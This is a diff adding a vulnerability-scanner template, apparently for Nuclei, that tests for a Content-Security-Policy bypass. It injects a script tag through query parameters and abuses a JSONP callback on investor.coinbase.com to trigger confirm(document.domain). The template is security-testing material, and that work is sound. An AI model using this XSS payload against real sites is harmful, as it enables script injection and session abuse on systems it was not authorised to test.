@@ -1,0 +1,55 @@
+id: coinbase-investor-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Coinbase Investor
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,coinbase-investor
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "coinbase.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: coinbase_investor_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "coinbase_investor_csp_xss == true"
+# digest: 490a0046304402205a7e1b9f90dbc8095d53c4cb5550e4c8a5cff39cf79dfddcfc4893b46cd07e1202207849c6c1684b1ec3ae9eba2417f56236d30002cf8998dde6d12b3507fd6dfa37:922c64590222798bb761d5b6d8e72950
